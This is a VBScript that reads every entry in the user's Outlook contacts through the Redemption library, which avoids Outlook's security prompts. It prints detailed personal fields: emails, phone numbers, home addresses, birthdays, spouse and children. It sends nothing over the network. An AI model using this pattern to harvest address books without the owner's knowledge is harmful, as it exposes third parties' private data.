dim Contact,  oContact 
set Application = CreateObject("Outlook.Application")
set AB = Application.Session.GetDefaultFolder(10)

Sub printIfNotEmpty(label, item)

	If Len(item) >0 Then
		wscript.stdout.writeline(label&":"&item)
	End If
End Sub

'Number of AddressBook Entries
num = AB.Items.Count
For count = 1 to num

	set oContact = AB.Items(count)
	set Contact = CreateObject("Redemption.SafeContactItem")
	Contact.Item = oContact 'never use "Set" when setting the Item property

'Who?
	printIfNotEmpty "FullName",Contact.FullName



'Internetz info
	printIfNotEmpty "Email1", Contact.Email1Address
	printIfNotEmpty "Email2", Email2Address
	printIfNotEmpty "Email3",Contact.Email3Address
	printIfNotEmpty "WebPage",Contact.WebPage
	printIfNotEmpty "IM",Contact.IMAddress
	printIfNotEmpty "ComputerNetworkName",Contact.ComputerNetworkName

'Personal info
	printIfNotEmpty "NickName",Contact.NickName
	printIfNotEmpty "Spouse",Contact.Spouse
	printIfNotEmpty "MobilePhone",Contact.MobileTelephoneNumber
	printIfNotEmpty "HomePhone",Contact.HomeTelephoneNumber
	printIfNotEmpty "HomeFax",Contact.HomeFaxNumber
	printIfNotEmpty "HomeAddress",Contact.HomeAddress
	printIfNotEmpty "HomeAddressStreet",Contact.HomeAddressStreet
	printIfNotEmpty "HomeAddressCity",Contact.HomeAddressCity
	printIfNotEmpty "HomeAddressState",Contact.HomeAddressState
	printIfNotEmpty "HomeAddressCountry",Contact.HomeAddressCountry
	printIfNotEmpty "HomeAddressPostalCode",Contact.HomeAddressPostalCode
	printIfNotEmpty "HomeAddressPOBox",Contact.HomeAddressPostOfficeBox

	printIfNotEmpty "Birthday",Contact.Birthday
	printIfNotEmpty "Anniversary",Contact.Anniversary
	printIfNotEmpty "Children",Contact.Children
	printIfNotEmpty "Gender",Contact.Gender
	printIfNotEmpty "Hobbies",Contact.Hobby
	printIfNotEmpty "Language",Contact.Language

'Business Info
	printIfNotEmpty "Profession",Contact.Profession
	printIfNotEmpty "JobTitle",Contact.JobTitle
	printIfNotEmpty "Department",Contact.Department
	printIfNotEmpty "ManagerName",Contact.ManagerName
	printIfNotEmpty "AssistantName",Contact.AssistantName
	printIfNotEmpty "AssistantNumber",Contact.AssistantTelephoneNumber
	printIfNotEmpty "CompanyMainTelephone",Contact.CompanyMainTelephoneNumber
	printIfNotEmpty "BizPhone",Contact.BusinessTelephoneNumber
	printIfNotEmpty "BizFax",Contact.BusinessFaxNumber
	printIfNotEmpty "BizAddress",Contact.BusinessAddress
	printIfNotEmpty "BizAddressStreet",Contact.BusinessAddressStreet
	printIfNotEmpty "BizAddressCity",Contact.BusinessAddressCity
	printIfNotEmpty "BizAddressState",Contact.BusinessAddressState
	printIfNotEmpty "BizAddressCountry",Contact.BusinessAddressCountry
	printIfNotEmpty "BizAddressPostalCode",Contact.BusinessAddressPostalCode
	printIfNotEmpty "BizAddressPOBox",Contact.BusinessAddressPostOfficeBox

	wscript.stdout.writeline("-----------------------")

'Misc Info

Next



